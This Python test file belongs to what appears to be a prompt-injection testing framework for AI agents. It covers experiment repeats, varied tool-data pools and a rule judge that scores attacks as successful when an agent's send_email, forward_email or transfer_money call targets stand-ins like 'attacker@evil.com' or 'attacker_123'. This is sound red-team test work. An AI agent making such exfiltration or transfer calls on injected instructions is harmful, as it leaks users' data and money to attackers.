"""Tests for simulation realism improvements:

1. Temperature & repeats — ExperimentConfig fields and matrix multi-run.
2. Tool data diversity — sample pools and random selection.
3. Judge sink_args — parameter-level verdict accuracy.
"""

import json
import os
import tempfile

from pikit.agent.base import Trace, TraceStep
from pikit.agent.samples import (
    WEBPAGE_POOL,
    EMAIL_POOL,
    DOCUMENT_POOL,
    CODE_POOL,
    SKILL_POOL,
    CHANNEL_MESSAGES_POOL,
    TRANSACTIONS_POOL,
    FEED_POOL,
    SEARCH_RESULT_POOL,
    EVENTS_POOL,
    FLIGHT_SEARCH_POOL,
    HOTEL_SEARCH_POOL,
)
from pikit.agent.builtin_tools import fetch_url, read_email, read_channel, read_feed
from pikit.config import ExperimentConfig
from pikit.judges import RuleJudge, JudgeResult
from pikit.matrix import MatrixRunner, ExperimentResult, run
from pikit.targets import ChatResponse, ToolCall


# ═══════════════════════════════════════════════════════════════════════
#  1. Temperature & Repeats
# ═══════════════════════════════════════════════════════════════════════

def test_config_temperature_default():
    """Default temperature is 0.0 (deterministic)."""
    cfg = ExperimentConfig()
    assert cfg.temperature == 0.0


def test_config_repeats_default():
    """Default repeats is 1 (single run)."""
    cfg = ExperimentConfig()
    assert cfg.repeats == 1


def test_config_temperature_from_dict():
    """Temperature can be loaded from a nested dict."""
    cfg = ExperimentConfig.from_dict({
        "matrix": {"temperature": 0.7},
    })
    assert cfg.temperature == 0.7


def test_config_repeats_from_dict():
    """Repeats can be loaded from a nested dict."""
    cfg = ExperimentConfig.from_dict({
        "matrix": {"repeats": 5},
    })
    assert cfg.repeats == 5


def test_config_num_combinations_with_repeats():
    """num_combinations multiplies by repeats."""
    cfg = ExperimentConfig(
        attacks=["a", "b"],
        defenses=["none"],
        agents=["chat"],
        channels=[""],
        repeats=3,
    )
    assert cfg.num_combinations() == 6


def test_config_sink_args_from_dict():
    """sink_args can be loaded from the judge section."""
    cfg = ExperimentConfig.from_dict({
        "judge": {"sink_args": {"to": "attacker@evil.com"}},
    })
    assert cfg.sink_args == {"to": "attacker@evil.com"}


def test_matrix_repeats_produces_summary():
    """With repeats > 1, matrix produces individual + summary rows."""
    cfg = ExperimentConfig(
        attacks=["naive"],
        defenses=["none"],
        agents=["chat"],
        channels=[""],
        target_spec="mock",
        judge_type="rule",
        repeats=3,
    )
    results = run(cfg)
    # 3 individual runs + 1 summary row.
    assert len(results) == 4
    individual = [r for r in results if "repeat_summary" not in r.signals]
    summaries = [r for r in results if "repeat_summary" in r.signals]
    assert len(individual) == 3
    assert len(summaries) == 1
    # Each individual has repeat_index set.
    for i, r in enumerate(individual):
        assert r.repeat_index == i
        assert r.total_runs == 3
    # Summary has success_count and total_runs.
    s = summaries[0]
    assert s.total_runs == 3
    assert s.success_count <= 3


def test_matrix_repeats_one_no_summary():
    """With repeats=1 (default), no summary row is produced."""
    cfg = ExperimentConfig(
        attacks=["naive"],
        defenses=["none"],
        agents=["chat"],
        channels=[""],
        target_spec="mock",
    )
    results = run(cfg)
    summaries = [r for r in results if "repeat_summary" in r.signals]
    assert len(summaries) == 0


# ═══════════════════════════════════════════════════════════════════════
#  2. Tool Data Diversity
# ═══════════════════════════════════════════════════════════════════════

def test_webpage_pool_has_variants():
    """Webpage pool has at least 3 distinct samples."""
    assert len(WEBPAGE_POOL) >= 3
    assert len(set(WEBPAGE_POOL)) >= 3  # all different


def test_email_pool_has_variants():
    """Email pool has at least 3 distinct samples."""
    assert len(EMAIL_POOL) >= 3
    assert len(set(EMAIL_POOL)) >= 3


def test_document_pool_has_variants():
    """Document pool has at least 3 distinct samples."""
    assert len(DOCUMENT_POOL) >= 3
    assert len(set(DOCUMENT_POOL)) >= 3


def test_code_pool_has_variants():
    """Code pool has at least 3 distinct samples."""
    assert len(CODE_POOL) >= 3
    assert len(set(CODE_POOL)) >= 3


def test_skill_pool_has_variants():
    """Skill pool has at least 3 distinct samples."""
    assert len(SKILL_POOL) >= 3
    assert len(set(SKILL_POOL)) >= 3


def test_channel_messages_pool_has_variants():
    """Channel messages pool has at least 3 distinct samples."""
    assert len(CHANNEL_MESSAGES_POOL) >= 3
    assert len(set(CHANNEL_MESSAGES_POOL)) >= 3


def test_transactions_pool_has_variants():
    """Transactions pool has at least 3 distinct samples."""
    assert len(TRANSACTIONS_POOL) >= 3
    assert len(set(TRANSACTIONS_POOL)) >= 3


def test_feed_pool_has_variants():
    """Feed pool has at least 3 distinct samples."""
    assert len(FEED_POOL) >= 3
    assert len(set(FEED_POOL)) >= 3


def test_search_result_pool_has_variants():
    """Search result pool has at least 3 distinct samples."""
    assert len(SEARCH_RESULT_POOL) >= 3
    assert len(set(SEARCH_RESULT_POOL)) >= 3


def test_events_pool_has_variants():
    """Events pool has at least 3 distinct samples."""
    assert len(EVENTS_POOL) >= 3
    assert len(set(EVENTS_POOL)) >= 3


def test_flight_search_pool_has_variants():
    """Flight search pool has at least 3 distinct samples."""
    assert len(FLIGHT_SEARCH_POOL) >= 3
    assert len(set(FLIGHT_SEARCH_POOL)) >= 3


def test_hotel_search_pool_has_variants():
    """Hotel search pool has at least 3 distinct samples."""
    assert len(HOTEL_SEARCH_POOL) >= 3
    assert len(set(HOTEL_SEARCH_POOL)) >= 3


def test_fetch_url_returns_varied_data():
    """fetch_url returns different data across calls (probabilistic)."""
    results = set()
    for _ in range(20):
        results.add(fetch_url(url="http://example.com"))
    # With 3 variants and 20 calls, very likely to see >1 unique result.
    assert len(results) >= 2


def test_read_email_returns_varied_data():
    """read_email returns different data across calls."""
    results = set()
    for _ in range(20):
        results.add(read_email())
    assert len(results) >= 2


def test_read_channel_returns_varied_data():
    """read_channel returns different data across calls."""
    results = set()
    for _ in range(20):
        results.add(read_channel(channel="#general"))
    assert len(results) >= 2


def test_read_feed_returns_varied_data():
    """read_feed returns different data across calls."""
    results = set()
    for _ in range(20):
        results.add(read_feed())
    assert len(results) >= 2


# ═══════════════════════════════════════════════════════════════════════
#  3. Judge Sink Args — Parameter-Level Verdict
# ═══════════════════════════════════════════════════════════════════════

def test_rule_judge_sink_args_match():
    """Sink call with matching args = success with high confidence."""
    trace = Trace(steps=[
        TraceStep("tool_call", tool_name="send_email", is_sink=True,
                  args={"to": "attacker@evil.com", "body": "secrets"}),
    ])
    judge = RuleJudge(
        canary="HACKED",
        require_sink=True,
        sink_args={"to": "attacker@evil.com"},
    )
    result = judge.judge(trace)
    assert result.success
    assert "sink_args_match" in result.signals
    assert result.confidence == "high"


def test_rule_judge_sink_args_mismatch():
    """Sink call with non-matching args = failure."""
    trace = Trace(steps=[
        TraceStep("tool_call", tool_name="send_email", is_sink=True,
                  args={"to": "alice@example.com", "body": "hello"}),
    ])
    judge = RuleJudge(
        canary="HACKED",
        require_sink=True,
        sink_args={"to": "attacker@evil.com"},
    )
    result = judge.judge(trace)
    assert not result.success
    assert "sink_args_mismatch" in result.signals
    assert result.confidence == "high"


def test_rule_judge_sink_args_partial_match():
    """Partial match (one key matches, other doesn't) = failure."""
    trace = Trace(steps=[
        TraceStep("tool_call", tool_name="transfer_money", is_sink=True,
                  args={"to_account": "attacker_123", "amount": "50"}),
    ])
    judge = RuleJudge(
        canary="HACKED",
        require_sink=True,
        sink_args={"to_account": "attacker_123", "amount": "10000"},
    )
    result = judge.judge(trace)
    assert not result.success
    assert "sink_args_mismatch" in result.signals


def test_rule_judge_sink_args_multiple_sinks():
    """Multiple sink calls — if any matches, it's a success."""
    trace = Trace(steps=[
        TraceStep("tool_call", tool_name="send_email", is_sink=True,
                  args={"to": "alice@example.com"}),
        TraceStep("tool_call", tool_name="forward_email", is_sink=True,
                  args={"to": "attacker@evil.com"}),
    ])
    judge = RuleJudge(
        canary="HACKED",
        require_sink=True,
        sink_args={"to": "attacker@evil.com"},
    )
    result = judge.judge(trace)
    assert result.success
    assert "sink_args_match" in result.signals


def test_rule_judge_sink_args_no_sink():
    """No sink fired with sink_args set = failure."""
    trace = Trace(final_text="HACKED")
    judge = RuleJudge(
        canary="HACKED",
        require_sink=True,
        sink_args={"to": "attacker@evil.com"},
    )
    result = judge.judge(trace)
    assert not result.success


def test_rule_judge_sink_args_empty():
    """Empty sink_args = no arg checking (backward compatible)."""
    trace = Trace(steps=[
        TraceStep("tool_call", tool_name="send_email", is_sink=True,
                  args={"to": "anyone@example.com"}),
    ])
    judge = RuleJudge(
        canary="HACKED",
        require_sink=True,
    )
    result = judge.judge(trace)
    assert result.success
    assert "sink_args_match" not in result.signals
    assert "sink_args_mismatch" not in result.signals


def test_rule_judge_sink_args_without_require_sink():
    """sink_args works even without require_sink — downgrades mismatch."""
    trace = Trace(steps=[
        TraceStep("tool_call", tool_name="send_email", is_sink=True,
                  args={"to": "alice@example.com"}),
    ])
    judge = RuleJudge(
        canary="HACKED",
        require_sink=False,
        sink_args={"to": "attacker@evil.com"},
    )
    result = judge.judge(trace)
    # Sink fired but args mismatch, no canary → failure.
    assert not result.success
    assert "sink_args_mismatch" in result.signals


def test_rule_judge_sink_args_case_insensitive():
    """sink_args matching is case-insensitive."""
    trace = Trace(steps=[
        TraceStep("tool_call", tool_name="send_email", is_sink=True,
                  args={"to": "ATTACKER@EVIL.COM"}),
    ])
    judge = RuleJudge(
        canary="HACKED",
        require_sink=True,
        sink_args={"to": "attacker@evil.com"},
    )
    result = judge.judge(trace)
    assert result.success
    assert "sink_args_match" in result.signals
